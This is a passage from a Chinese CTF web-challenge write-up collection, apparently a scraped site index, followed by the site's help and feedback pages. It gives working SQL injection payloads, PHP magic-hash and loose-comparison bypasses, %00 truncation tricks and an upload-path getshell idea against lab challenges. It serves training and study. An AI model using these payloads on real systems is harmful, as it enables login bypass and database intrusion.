mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } mysql_close($con); ?> 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql> create table test ( -> user varchar(100) not null, -> pwd varchar(100) not null);mysql>insert into test values(\"admin\",\"mypass\");mysql>select from test group by pwd with rollupmysql> select from test group by pwd with rollup;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass || admin | mypass || admin | NULL |+-------+------------+3 rows in setmysql> select from test group by pwd with rollup limit 1;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+mysql> select from test group by pwd with rollup limit 1 offset 0;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 1;+-------+--------+| user | pwd |+-------+--------+| admin | mypass |+-------+--------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 2;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3 简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程： exp函数报错一把嗦 0x0A 简单的sql注入之2 简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程： 简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 /**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1 简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程 selectselect 0x0C 天下武功唯快不破 简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程： import requests,base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') key=base64.b64decode(r.headers['FLAG'])[-9:] r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key}) print(r.text) 0x0D 让我进去 简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角 简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程： index.php/index.php 0X0F Forms 简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统 简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程： 右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x11 忘记密码了 简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程： 打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 ........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&&!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r>0){ echo $flag; }else{ echo \"失败了呀\"; } } payload: token=0e11111111&emailAddress=admin@simplexue.com 0x12 Once More 简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程： 打开题目，得到题目源码： You password must be alphanumeric'; } else if (strlen($_GET['password']) 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('*-* have not been found'); } } else { echo 'Invalid password'; } } ?> 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session 简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程： 打开题目得到源码： Wrong guess.'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE 简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&password[]=2 解题过程： 打开题目获得源码： Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; } else{ echo 'Login first!'; ?> 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&password[]=b 0x15 上传绕过 简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程： burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200 简单概括： 考点：逆加密过程 难度：易 WP：部分： x = \"~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg\" c = \"\" for a in x: b = ord(a) c += chr(b-1) print(c) 解题过程： 打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题 简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1 解题过程： 打开题目，右键查看源代码得到题目源码： welcome to simplexue connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \"Logged in! Key:************** \"; } else { echo(\"Log in failure!\"); } } ?> strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd: user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西? 简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程： 复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法 简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程： 打开题目，页面提示：index.php.txt，打开得到源码： not allowed!\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\"; echo \"flag: *****************} \"; } ?> Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单! 简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难 简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大 简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠 简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程： 查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难 简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦 评论区 请文明评论，禁止广告 "},"help.html":{"url":"help.html","title":"加入我们完善网站!","keywords":"","body":"帮助我们     我们诚邀各位热爱CTF的师傅一起不断完善此站点，致力于建成一个完整的CTF题库。    犹记得刚接触CTF时，被一个简单的题目卡了半天，百度找到的答案全都是复制粘贴的垃圾答案。相信很多人都应该与我一样遇到这种事。带着为避免让后来者重走我们的坑的希望，我创建了此站点，但我深知，我一人的力量是远远不足的，在此我诚挚地邀请您加入此项目，在这里你是自由的，没有硬性指标，让我们一起为之一起奋斗吧。    注：本站点纯公益，对本站有贡献的小伙伴将会在首页被公开致谢。 目前可做的事： 目前大家可以做的事情有： 提交写好的Writeup 提出利于网站建设的建议 负责网站的管理与维护 关于提交WP:     为方便站点维护和管理，提交的wp应该遵循以下条件： 内容     为确定站点WP的质量，每个提交的Writeup均需要经过审核组的审核。    对于提交的内容审核组有权进行相应的修改或添加。 模板     首先，我们的Writeup需要按照markdown语法来书写。Markdown教程    其次，md文件 应按照以下格式： # 20xxxxx 如2019DDCTF滴滴高校赛 xxxx ## 题目类型： |类型|年份|难度| |:---:|:---:|:---:| |xxx|20xx|xx| # 网上公开WP： + xxx + xxx + xxx + xxx # 题目下载: + xxx(百度网盘) # 本站备份WP： --- writeup~ ---     注意排面干净整洁，禁止引入非图片的外部资源，如js，css等。    Demo：2019DDCTF 命名     md文件的命名应遵循以下原则：    年份+名称.md，如：2019ddctf.md 版权     搜集的文章必须无版权争议，原作者禁止转载的WP拒收，在每种类型的题目WP之前应先感谢原作者，原公开WP的链接要保留放在公开WP区域内。 提交地址 加入官方QQ群937886410，提交给审核组即可。 关于提交建议 内容     提交的建议必须具有建设性。 提交地址 邮箱：asp-php@foxmail.com 关于管理维护 要求 有责任心 删除垃圾评论 能够时不时确定网站情况 能够处理突发事件，如：coding page服务中断，更换github page服务。 提交地址 邮箱：asp-php@foxmail.com，注明申请管理。 "},"reply.html":{"url":"reply.html","title":"有问题?请在这里反馈!","keywords":"","body":"请在这里留下你的宝贵建议 官方互助群 快来加群一起讨(gao)论(ji)啊。 点我加群 :)群号: 937886410 评论区 请文明评论，禁止广告 "}}